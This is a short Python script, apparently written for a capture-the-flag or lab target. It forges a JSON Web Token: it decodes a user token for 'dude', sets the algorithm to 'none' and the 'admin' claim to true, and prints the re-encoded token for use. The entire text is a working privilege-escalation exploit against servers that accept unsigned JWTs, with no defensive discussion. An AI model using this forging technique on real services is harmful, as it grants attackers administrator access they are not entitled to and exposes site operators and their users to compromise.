import base64
import json
# start by creating a token entering an username
# for this, I used "dude"
generated_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImR1ZGUiLCJhZG1pbiI6ZmFsc2V9.oA-ZublvSwK-UYoY5ZTbac2JzBrigBy80K1AZHHR3Hk"

token_blocks = generated_token.split('.')

# decode and modify
header_json = json.loads(base64.b64decode(token_blocks[0]))
payload_json = json.loads(base64.b64decode(token_blocks[1]+"=="))

# check
print("decoded:")
print(header_json)
print(payload_json)

# update to disable verification and escalate to admin
header_json["alg"] = "none"
payload_json["admin"] = True

# re-generate
header_token = base64.b64encode(bytes(json.dumps(header_json), "utf-8"))
payload_token = base64.b64encode(bytes(json.dumps(payload_json), "utf-8"))

# debug
print("encoded:")
print(f"Header Token: {header_token}")
print(f"Payload Token: {payload_token}")

# generate final token
final_token = ".".join( [ header_token.decode("utf-8").rstrip("="), payload_token.decode("utf-8").rstrip("="), token_blocks[2] ])
print(f"Token to use: {final_token}")

